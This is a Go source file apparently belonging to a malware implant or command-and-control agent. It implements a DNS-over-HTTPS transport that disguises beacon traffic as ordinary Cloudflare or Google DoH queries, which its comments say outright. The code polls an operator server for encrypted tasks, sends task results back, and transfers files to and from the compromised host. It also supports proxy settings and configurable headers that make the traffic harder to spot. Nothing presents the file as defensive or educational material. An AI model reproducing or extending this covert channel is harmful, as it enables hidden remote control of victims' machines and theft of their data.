//go:build !stub

package agent

// DNS-over-HTTPS (DoH) C2 transport — RFC 8484 style.
//
// The agent GETs  <ServerURL>/dns-query?name=<base32(data)>&type=TXT
// where the "name" value is covert beacon data encoded as base32 and
// split into 63-character DNS labels joined by dots, blending with
// legitimate Cloudflare/Google DoH traffic.
//
// Operation prefixes:
//   b.<base32(agentID)>               beacon poll
//   r.<base32(JSON{a:id, d:b64ct})>   result submission
//
// Responses are returned as minimal DNS wireformat TXT records
// (Content-Type: application/dns-message).  Large results (ciphertext
// > dohMaxResultBytes) fall back to a direct HTTP POST to /result/.

import (
	"bytes"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// dohMaxResultBytes is the ciphertext size above which we fall back to
// a plain HTTP POST rather than squeezing everything into a URL parameter.
const dohMaxResultBytes = 3000

// dohB32 is the base32 codec used by the DoH transport.
var dohB32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// dohEncode base32-encodes data and splits the result into 63-char DNS
// labels joined with dots so the whole thing looks like a domain name.
func dohEncode(data []byte) string {
	encoded := dohB32.EncodeToString(data)
	var labels []string
	for len(encoded) > 63 {
		labels = append(labels, encoded[:63])
		encoded = encoded[63:]
	}
	if len(encoded) > 0 {
		labels = append(labels, encoded)
	}
	return strings.Join(labels, ".")
}

// dohDecode reverses dohEncode: strips dots and base32-decodes.
func dohDecode(name string) ([]byte, error) {
	clean := strings.ReplaceAll(strings.ToUpper(name), ".", "")
	return dohB32.DecodeString(clean)
}

// dohTransport implements the transport interface over DNS-over-HTTPS.
type dohTransport struct {
	client    *http.Client
	serverURL string
	agentID   string
	aesKey    []byte
}

func (d *dohTransport) agentIDStr() string { return d.agentID }

// newDoHTransport creates a DoH transport targeting serverURL.
func newDoHTransport(serverURL string) *dohTransport {
	tr := &http.Transport{}
	if ProxyURL != "" {
		if pu, err := url.Parse(ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	return &dohTransport{
		client:    &http.Client{Transport: tr, Timeout: 30 * time.Second},
		serverURL: serverURL,
	}
}

// dohApplyHeaders sets DoH-appropriate request headers.
func (d *dohTransport) dohApplyHeaders(req *http.Request) {
	req.Header.Set("User-Agent", UserAgent)
	req.Header.Set("Accept", "application/dns-message")
	if HttpHeaders != "" {
		for _, hdr := range strings.Split(HttpHeaders, ";") {
			hdr = strings.TrimSpace(hdr)
			if idx := strings.Index(hdr, ":"); idx > 0 {
				k := strings.TrimSpace(hdr[:idx])
				v := strings.TrimSpace(hdr[idx+1:])
				if k != "" {
					req.Header.Set(k, v)
				}
			}
		}
	}
	if HttpHeadersRemove != "" {
		for _, h := range strings.Split(HttpHeadersRemove, ",") {
			req.Header.Del(strings.TrimSpace(h))
		}
	}
}

// dohGet sends GET /dns-query?name=<name>&type=TXT and returns the
// concatenated TXT character-strings from the DNS wireformat response.
// Returns nil, nil for HTTP 204 (no content / no tasks).
func (d *dohTransport) dohGet(name string) ([]byte, error) {
	u := d.serverURL + "/dns-query?name=" + url.QueryEscape(name) + "&type=TXT"
	req, err := http.NewRequest(http.MethodGet, u, nil)
	if err != nil {
		return nil, err
	}
	d.dohApplyHeaders(req)

	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("doh: status %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if err != nil {
		return nil, err
	}
	return dohParseTXTRecord(body), nil
}

// dohParseTXTRecord extracts and concatenates all TXT character-strings
// from the first TXT answer in a minimal DNS wireformat response.
func dohParseTXTRecord(data []byte) []byte {
	if len(data) < 12 {
		return nil
	}
	ancount := int(data[6])<<8 | int(data[7])
	qdcount := int(data[4])<<8 | int(data[5])
	if ancount == 0 {
		return nil
	}

	pos := 12
	// Skip question section if present.
	for q := 0; q < qdcount && pos < len(data); q++ {
		for pos < len(data) {
			b := data[pos]
			if b == 0 {
				pos++
				break
			}
			if b&0xC0 == 0xC0 {
				pos += 2
				break
			}
			pos += int(b) + 1
		}
		if pos+4 <= len(data) {
			pos += 4 // QTYPE + QCLASS
		}
	}

	// Parse answer records, return the first TXT record's data.
	for i := 0; i < ancount && pos < len(data); i++ {
		// Skip answer NAME (may be a 2-byte pointer or a label sequence).
		if pos >= len(data) {
			break
		}
		if data[pos]&0xC0 == 0xC0 {
			pos += 2
		} else {
			for pos < len(data) {
				if data[pos] == 0 {
					pos++
					break
				}
				pos += int(data[pos]) + 1
			}
		}
		if pos+10 > len(data) {
			break
		}
		rtype := int(data[pos])<<8 | int(data[pos+1])
		pos += 2 // type
		pos += 2 // class
		pos += 4 // ttl
		rdlen := int(data[pos])<<8 | int(data[pos+1])
		pos += 2
		if rdlen == 0 || pos+rdlen > len(data) {
			break
		}
		rdata := data[pos : pos+rdlen]
		pos += rdlen

		if rtype == 16 { // TXT
			// Collect all character-strings: each is 1-byte length + data.
			var txt []byte
			rdpos := 0
			for rdpos < len(rdata) {
				slen := int(rdata[rdpos])
				rdpos++
				if rdpos+slen > len(rdata) {
					txt = append(txt, rdata[rdpos:]...)
					break
				}
				txt = append(txt, rdata[rdpos:rdpos+slen]...)
				rdpos += slen
			}
			return txt
		}
	}
	return nil
}

// register performs agent registration via the standard HTTP /register endpoint.
// DoH is only used for the beacon loop; bootstrapping reuses the HTTP handler.
func (d *dohTransport) register(info sysInfo) error {
	h := newHTTPTransport(d.serverURL)
	if err := h.register(info); err != nil {
		return err
	}
	d.agentID = h.agentID
	d.aesKey = h.aesKey
	if len(d.aesKey) > 0 {
		RegisterScramblerTarget(d.aesKey)
	}
	return nil
}

// beacon polls for pending tasks.
// Sends: GET /dns-query?name=b.<base32(agentID)>&type=TXT
// Response TXT: base64(AES-GCM encrypted beaconResponse JSON)
func (d *dohTransport) beacon() ([]taskWire, error) {
	name := "b." + dohEncode([]byte(d.agentID))
	raw, err := d.dohGet(name)
	if err != nil {
		return nil, err
	}
	if len(raw) == 0 {
		return nil, nil // no tasks
	}
	// raw = base64(AES-GCM sealed beaconResponse JSON)
	ciphertext, err := base64.StdEncoding.DecodeString(string(raw))
	if err != nil {
		return nil, fmt.Errorf("doh beacon: base64: %w", err)
	}
	plaintext, err := open(d.aesKey, ciphertext)
	if err != nil {
		return nil, fmt.Errorf("doh beacon: decrypt: %w", err)
	}
	var br beaconResponse
	if err := json.Unmarshal(plaintext, &br); err != nil {
		return nil, err
	}
	return br.Tasks, nil
}

// sendResult submits a task result via DoH for small payloads, or falls back
// to a direct HTTP POST for large ones.
//
// DoH path: GET /dns-query?name=r.<base32(JSON{a:agentID, d:b64ct})>&type=TXT
// Response TXT: "ack"
func (d *dohTransport) sendResultAdmin(taskID int64, output, errStr string, _ bool) error {
	return d.sendResult(taskID, output, errStr)
}

func (d *dohTransport) sendResult(taskID int64, output, errStr string) error {
	plaintext, err := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr})
	if err != nil {
		return err
	}
	ciphertext, err := seal(d.aesKey, plaintext)
	if err != nil {
		return err
	}

	if len(ciphertext) > dohMaxResultBytes {
		// Payload too large for a URL parameter — fall back to HTTP POST.
		return d.sendResultHTTP(ciphertext)
	}

	payload, err := json.Marshal(map[string]string{
		"a": d.agentID,
		"d": base64.StdEncoding.EncodeToString(ciphertext),
	})
	if err != nil {
		return err
	}
	_, err = d.dohGet("r." + dohEncode(payload))
	return err
}

// sendResultHTTP falls back to a direct POST to /result/<agentID> when the
// ciphertext is too large to encode in a URL query parameter.
func (d *dohTransport) sendResultHTTP(ciphertext []byte) error {
	req, err := http.NewRequest(http.MethodPost,
		d.serverURL+"/result/"+d.agentID,
		bytes.NewReader(ciphertext))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", UserAgent)
	resp, err := d.client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

// uploadFile delegates to the HTTP transport for file uploads.
func (d *dohTransport) uploadFile(taskID int64, filename string, data []byte) error {
	h := &httpTransport{
		client:    d.client,
		serverURL: d.serverURL,
		agentID:   d.agentID,
		aesKey:    d.aesKey,
	}
	return h.uploadFile(taskID, filename, data)
}

// downloadFile delegates to the HTTP transport for file downloads.
func (d *dohTransport) downloadFile(filename string) ([]byte, error) {
	h := &httpTransport{
		client:    d.client,
		serverURL: d.serverURL,
		agentID:   d.agentID,
		aesKey:    d.aesKey,
	}
	return h.downloadFile(filename)
}
